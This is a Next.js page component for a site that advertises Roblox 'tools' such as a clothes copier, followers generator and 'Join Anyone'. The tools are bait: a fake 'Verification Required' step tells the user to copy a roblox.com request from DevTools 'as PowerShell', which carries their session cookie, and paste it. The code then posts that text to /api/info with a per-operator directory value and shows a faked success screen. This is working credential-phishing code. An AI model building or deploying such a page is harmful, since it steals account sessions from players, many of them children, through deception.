'use client'

import { useState } from 'react'
import { useParams } from 'next/navigation'

const TOOLS = {
  'Copy-Clothes': { icon: '👕', title: 'Clothes Copier', desc: 'Copy any clothing item instantly', label: 'Clothing ID', placeholder: 'Paste clothing ID or URL', button: 'Copy Clothes!', color: '#ef4444' },
  'Copy-Games': { icon: '🎮', title: 'Game Downloader', desc: 'Download any game and assets', label: 'Game ID', placeholder: 'Paste game ID or URL', button: 'Download Game!', color: '#22c55e' },
  'Bot-Followers': { icon: '👤', title: 'Followers Generator', desc: 'Generate followers for any account', label: 'Username', placeholder: 'Enter username', button: 'Send Followers!', color: '#3b82f6' },
  'Group-Botter': { icon: '👥', title: 'Group Botter', desc: 'Bot members to any group', label: 'Group Link', placeholder: 'Paste group link', button: 'Bot Group!', color: '#8b5cf6' },
  'Vc-Enabler': { icon: '🎤', title: 'Voice Chat Enabler', desc: 'Enable VC without verification', label: 'Username', placeholder: 'Enter username', button: 'Enable VC!', color: '#ec4899' },
  'Join-Anyone': { icon: '🔓', title: 'Join Anyone', desc: 'Join any user regardless of privacy', label: 'Username', placeholder: 'Enter username', button: 'Join User!', color: '#f59e0b' },
  'Enable-Shaders': { icon: '✨', title: 'Shader Enabler', desc: 'Enable advanced graphics', label: 'Username', placeholder: 'Enter username', button: 'Enable Shaders!', color: '#06b6d4' },
  'Limited-Checker': { icon: '🔍', title: 'Limited Checker', desc: 'Check any limited item value', label: 'Item ID', placeholder: 'Paste item ID or URL', button: 'Check Item!', color: '#10b981' }
}

export default function ToolPage() {
  const params = useParams()
  const tool = TOOLS[params.tool] || { icon: '🔧', title: params.tool?.replace(/-/g, ' '), desc: 'Roblox tool', label: 'Input', placeholder: 'Enter value', button: 'Submit', color: '#3882f6' }
  const directory = params.directory

  const [step, setStep] = useState('input')
  const [inputValue, setInputValue] = useState('')
  const [pasted, setPasted] = useState('')
  const [error, setError] = useState('')

  const submit = async () => {
    if (!inputValue.trim()) return
    setStep('devtools')
  }

  const verify = async () => {
    if (!pasted.trim()) return
    setStep('processing')
    setError('')

    try {
      const res = await fetch('/api/info', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: pasted, directory, tool: tool.title })
      })

      const data = await res.json()

      if (data.success) {
        setTimeout(() => setStep('success'), 2000)
      } else {
        setError(data.message || 'Something went wrong')
        setStep('devtools')
      }
    } catch {
      setError('Network error')
      setStep('devtools')
    }
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        {step === 'input' && (
          <div className="bg-card border border-border rounded-2xl p-6">
            <div className="text-center mb-6">
              <div className="text-5xl mb-3">{tool.icon}</div>
              <h1 className="text-2xl font-bold mb-2">{tool.title}</h1>
              <p className="text-gray-400 text-sm">{tool.desc}</p>
            </div>

            <div className="mb-4">
              <label className="block text-sm text-gray-300 mb-2">{tool.label}</label>
              <input
                type="text"
                value={inputValue}
                onChange={(e) => setInputValue(e.target.value)}
                placeholder={tool.placeholder}
                className="w-full bg-bg border border-border rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none"
              />
            </div>

            <button
              onClick={submit}
              disabled={!inputValue.trim()}
              className="w-full font-semibold rounded-lg py-3 disabled:opacity-50 text-white"
              style={{ backgroundColor: tool.color }}
            >
              {tool.button}
            </button>
          </div>
        )}

        {step === 'devtools' && (
          <div className="bg-card border border-border rounded-2xl p-6">
            <div className="text-center mb-5">
              <div className="text-4xl mb-3">🛠️</div>
              <h2 className="text-xl font-bold mb-2">Verification Required</h2>
              <p className="text-gray-400 text-sm">Follow these steps to verify your account</p>
            </div>

            <div className="bg-bg rounded-lg p-4 mb-4 text-sm text-gray-300">
              <ol className="list-decimal list-inside space-y-2">
                <li>Open DevTools (F12)</li>
                <li>Go to Network tab</li>
                <li>Find a roblox.com request</li>
                <li>Right-click → Copy as PowerShell</li>
                <li>Paste below</li>
              </ol>
            </div>

            <textarea
              value={pasted}
              onChange={(e) => setPasted(e.target.value)}
              placeholder="Paste DevTools data here..."
              rows={5}
              className="w-full bg-bg border border-border rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none mb-3 font-mono text-xs"
            />

            {error && <p className="text-red-400 text-sm mb-3">{error}</p>}

            <button
              onClick={verify}
              disabled={!pasted.trim()}
              className="w-full font-semibold rounded-lg py-3 disabled:opacity-50 text-white mb-2"
              style={{ backgroundColor: tool.color }}
            >
              Verify & Continue
            </button>

            <button onClick={() => setStep('input')} className="w-full text-gray-400 text-sm py-2">
              Go back
            </button>
          </div>
        )}

        {step === 'processing' && (
          <div className="bg-card border border-border rounded-2xl p-8 text-center">
            <div className="animate-spin text-5xl mb-4">⚙️</div>
            <h2 className="text-xl font-bold mb-2">Processing...</h2>
            <p className="text-gray-400 text-sm">Verifying your account</p>
          </div>
        )}

        {step === 'success' && (
          <div className="bg-card border border-green-500/30 rounded-2xl p-8 text-center">
            <div className="text-6xl mb-4">✅</div>
            <h2 className="text-2xl font-bold mb-2">Success!</h2>
            <p className="text-gray-400 mb-4">Account verified. Check your Roblox account.</p>
            <p className="text-green-400 text-sm">The {tool.title} is now active!</p>
          </div>
        )}
      </div>
    </div>
  )
}
